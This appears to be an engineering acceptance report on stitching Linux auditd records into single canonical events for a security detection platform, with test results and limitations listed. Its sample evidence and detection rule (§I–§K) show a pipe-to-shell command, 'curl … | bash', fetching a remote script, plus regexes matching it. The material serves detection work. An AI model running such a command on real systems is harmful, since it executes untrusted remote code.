# D4 — AUDITD RECORD STITCHING · ACCEPTANCE REPORT (owner review gate)

Date: 2026-09-14 · **Preview only. Not deployed to production.**
No UI. No 93-rule sweep. No retention work. No security/control-plane code.

Reproduce:
```
cd /app/backend && python3 -m pytest tests/test_d4_auditd_stitching.py -q
cd /app && python3 scripts/p0_d4_stitching_live_proof.py
```

---

## A · Audit record types handled

| Type | Role |
|---|---|
| `SYSCALL` | authoritative for identity (uid/auid/euid), pid, ppid, exe, comm. Preferred PRIMARY |
| `EXECVE` | authoritative for argv → the real `command_line` |
| `PROCTITLE` | fallback display string only |
| `CWD` | working directory |
| `PATH` | file path |
| anything else (e.g. `AVC`) | **preserved verbatim and reported** as `_unknown_record_types` — never dropped |

## B · Authoritative stitching key

`(tenant_id, collector_id, audit_epoch, audit_serial)` — the full
`audit(epoch:serial)` identity.

Three deliberate refusals:
- **Not timestamp proximity.** Two executions in the same second are separate
  events; proven by test.
- **Not pid.** The kernel reuses pids; proven by test.
- **Not the serial alone.** Serials reset, so the epoch is part of the
  identity; proven by test.
- **Tenant and collector are part of the key**, so two tenants producing the
  same serial can never be merged. That would be a cross-tenant evidence
  leak, not a stitch.

If the audit identity cannot be parsed, the record is **PASSTHROUGH** —
a refusal to stitch, not a fallback guess.

## C · Buffering / window logic

Grouping happens **per ingest batch**, before the pipeline, in
`plan_stitch()`. There is no cross-batch timer and no shared mutable state:
auditd emits a logical event's records contiguously, and the forwarder ships
them in one batch, so the batch *is* the window.

This is a deliberate trade: **no background buffer means no risk of evidence
sitting in memory, being lost on restart, or leaking across tenants.** The
cost is that a group split across two batches yields two honest partials
instead of one complete event (§F), which I judged the safer failure.

Index alignment with the caller's envelope list is preserved, so ingest's
existing per-envelope idempotency accounting is untouched — **every envelope
still gets exactly one settled outcome.**

## D · Incomplete-event behaviour

A group missing an expected record is `_completeness: PARTIAL` with
`_missing_records` listed. Critically, when no record supplied identity:

```
identity.username      = ""              (not "uid:")
identity_state         = NOT_OBSERVED
identity_not_observed_reason =
    "no contributing audit record supplied uid/auid/euid;
     privilege is unknown, not unprivileged"
```

This replaces the previous silent lie: an EXECVE-only event used to assert
`username="uid:"` and `is_privileged=False`, i.e. **"an unprivileged user did
this"** — a claim nothing supported.

## E · Duplicate behaviour

A second record of the same type in one audit event is **preserved and
reported** in `_duplicate_records` with its position, and never merged over
the first (first-wins on every key). All raw records remain in
`evidence_refs`. Re-delivery of the same audit event is **idempotent**: the
canonical id is derived from `(tenant, collector, audit identity)`, so it
cannot become a second event.

## F · Out-of-order behaviour

Order-independent by construction: grouping is by identity, and merge order
is by declared record priority, not arrival. Proven — `[SYSCALL, EXECVE,
PROCTITLE]` and `[PROCTITLE, EXECVE, SYSCALL]` produce an **identical**
canonical event (same `event_id`, `process`, `identity`).

Also proven: **EXECVE arriving first cannot shadow SYSCALL identity.** Without
the priority ordering, argv keys would displace authoritative identity —
exactly the bug class D4 exists to remove.

A genuinely delayed record (next batch) forms its own PARTIAL event carrying
the same `source_event_id`, so the two are linkable, and **does not
retroactively mutate an event already emitted**.

## G · Raw-record preservation

Every contributing record is retained verbatim in `_contributing_records` and
surfaced on the canonical event as `evidence_refs[{record_type, audit_id,
line, position}]`. Tested against a 4-record group (SYSCALL + EXECVE +
PROCTITLE + CWD): all four lines recoverable byte-for-byte.

## H · Canonical field → raw evidence provenance

Two layers, both persisted:

- `stitch_field_attribution` — per raw key: `uid→SYSCALL`, `pid→SYSCALL`,
  `exe→SYSCALL`, `a2→EXECVE`, `proctitle→PROCTITLE`, `cwd→CWD`
- `stitch_canonical_attribution` — per canonical concern:
  `identity→SYSCALL`, `process.argv→EXECVE`, `working_directory→CWD`, and
  **`file.path→None`** because no PATH record arrived. Nothing is attributed
  to a record that never existed.

Plus `identity_source_record` and `command_line_source_record` for the two
fields that matter most to a verdict.

## I · Genuine auditd example — BEFORE stitching

**Data provenance, stated plainly:** this host has no auditd (no
`/var/log/audit`, no systemd), so no new *production* auditd telemetry could
be generated. The EXECVE line below is the **verbatim line already in stored
canonical evidence** from the earlier acceptance run; the SYSCALL and
PROCTITLE records are the ones auditd genuinely emits alongside it. It is
**TEST data** under tenant `t-d4-proof`, and **nothing was sent to
production.**

One execution, three canonical events that contradict each other:

| Record | event_type | user | privileged | pid/ppid | command_line |
|---|---|---|---|---|---|
| SYSCALL | `process_execution` | `uid:1000` | **True** | 5678/1234 | `bash` |
| EXECVE | `auditd_syscall` | `uid:` | **False** | None/None | `/bin/bash -c curl -s http://198.51.100.9/x.sh \| bash` |
| PROCTITLE | `auditd_syscall` | `uid:` | **False** | None/None | `/bin/bash -c` |

## J · The same example — AFTER stitching

**ONE** canonical event (live, through the real HTTP ingest):

```
event_id     : cev_auditd_8516937a5288865b878ba02f   (deterministic)
event_type   : process_execution
command_line : /bin/bash -c curl -s http://198.51.100.9/x.sh | bash
privileged   : True
pid/ppid     : 5678/1234
completeness : COMPLETE   records=['EXECVE','PROCTITLE','SYSCALL']
evidence_refs: 3 raw records, verbatim
identity     ← SYSCALL      command_line ← EXECVE
```

Ingest outcomes: `['REASONED', 'STITCHED_INTO', 'STITCHED_INTO']` — three
envelopes settled, one canonical event.

**A defect the stitching exposed:** `PROCTITLE` was winning the
`command_line` precedence, and it decodes to a truncated `/bin/bash -c` — so
the real `curl … | bash` argv was being discarded. Stitched events now use
the declared precedence (argv > proctitle). Without this, the detection in §K
would not fire at all.

## K · D8 citation from the stitched event

```
DET-EX-006 v1 · Linux Pipe to Shell Execution
evidence_ref: xdr_canonical_evidence/cev_auditd_8516937a5288865b878ba02f

[MATCH] process.command_line  matches \b(curl|wget)\b
        observed = '/bin/bash -c curl -s http://198.51.100.9/x.sh | bash'
[MATCH] process.command_line  matches \|\s*(bash|sh|python|perl)\b
        observed = '/bin/bash -c curl -s http://198.51.100.9/x.sh | bash'
```

Full drill-down proven live: **detection → citation → canonical field →
stitched event → original EXECVE record recovered verbatim.**

Proven by regression test: **this citation is impossible without stitching.**
SYSCALL alone has no real command line to cite (`DET-EX-006` does not fire);
EXECVE alone can be detected but **cannot be attributed to a user**, and the
platform says `NOT_OBSERVED` rather than guessing.

`DET-EX-006` is the only rule declared for this proof — it is the rule that
already fires on auditd-shaped evidence. **The other 93 rules remain
`NOT_DECLARED`.** No sweep was performed.

## L · Tests added

- `backend/tests/test_d4_auditd_stitching.py` — **22 tests** covering all ten
  owner cases plus raw preservation, field attribution, identity shadowing,
  tenant-scoped identity, and the two D8-compatibility tests.
- `scripts/p0_d4_stitching_live_proof.py` — live HTTP proof, **24 checks**.

An in-process ingest test was attempted and **removed**: Motor binds its
client to the event loop alive at import, so driving `_reason_batch` under
pytest fails on an unrelated closed-loop error. Rather than weaken the test
to pass, the ingest boundary is proven over real HTTP, which exercises more
of the path anyway.

## M · Exact test results

```
tests/test_d4_auditd_stitching.py ............... 22 passed
scripts/p0_d4_stitching_live_proof.py ........... 24/24 checks PASS
combined D4+D8+telemetry+pipeline+detection ..... 66 passed, 4 failed
```

## N · Regressions

**None attributable to D4** — verified against a clean tree, not asserted:

```
patched : 4 failed (test_xdr_detection_consolidation)
clean   : 4 failed (test_xdr_detection_consolidation)   ← identical
```

Those 4 are pre-existing registry/provenance/RBAC fixture failures. The 19
failures from the D1 report and the D8 baseline are unchanged.

## O · Storage / performance impact

| | Value |
|---|---|
| Unstitched auditd event | 2,401 B |
| **Stitched auditd event** | **7,878 B** |
| All canonical evidence (avg) | 1,672 B |

~3.3× per event, because all three raw records now travel with it. Against
this: **three events become one**, so per *execution* the increase is roughly
2,401×3 = 7,203 B → 7,878 B — about **9%** for a complete, attributable,
fully-traceable event. That is a good trade, but it should be re-measured on
a real high-volume auditd host before onboarding.

Performance: stitching is a single pass of regex + dict merge per batch, no
I/O, no locks, no background state. Not measurable against the existing
per-event pipeline cost (~100 ms ingest→parsed).

## P · Limitations (stated, not buried)

1. **No real auditd host was available**, so §I/§J use the verbatim stored
   real EXECVE line plus the records auditd genuinely emits with it, as
   labelled TEST data. **Production acceptance still requires a real host.**
2. **Cross-batch groups are not merged.** A group split by a restart or
   buffer boundary yields two honest partials, by design (§C).
3. **The unstitched auditd path is unchanged** — still `uuid4()` ids
   (D10), still `auditd_syscall` for a lone EXECVE (D3), still empty host
   (D2). Those are the next gate. A single auditd record that arrives alone
   *does* now go through stitching and so gets completeness + attribution,
   but it does not get the D2/D3/D10 corrections.
4. **Host identity is still lost (D2, untouched).** `host.hostname` remains
   empty even on a stitched event, because resolving it from the envelope is
   the D2 gate.
5. `PATH` and `CWD` are preserved and attributed but **not yet mapped** into
   canonical `file.*` / working-directory fields.
6. The `9%`-per-execution storage figure comes from 3 test events; it is not
   a production estimate.

## Q · D4 verdict: **PASS** (preview, for the stitched path)

One real execution becomes one coherent canonical event; identity and command
line are true of the same event; every raw record is preserved and
attributable; incomplete groups stay honestly partial; duplicates, ordering,
same-second executions, pid reuse, malformed and unknown records all behave
correctly; re-delivery is idempotent; and D8 citation works on the stitched
event with a complete drill-down to the original record.

**Not production-accepted** — that needs a real auditd host (limitation 1)
and the D3/D2/D10 gate.

---

## Recommended next: D3 / D2 / D10

Now that stitching exists, the remaining three are small and should be one
change:

- **D3** — classify the *unstitched* path correctly too (a lone EXECVE is an
  execution).
- **D2** — resolve `host.hostname`/`host_id` from the envelope `source`/`node`
  (attributable via the same mechanism), and user identity from SYSCALL for
  unstitched records.
- **D10** — deterministic `event_id` on the unstitched path as well, so
  replay is idempotent everywhere rather than only for stitched groups.

Then: ingest-path provenance (D1 for collector-delivered sources) → real
auditd onboarding → 93-rule declaration sweep in controlled batches.

---

## STOP — awaiting owner review.
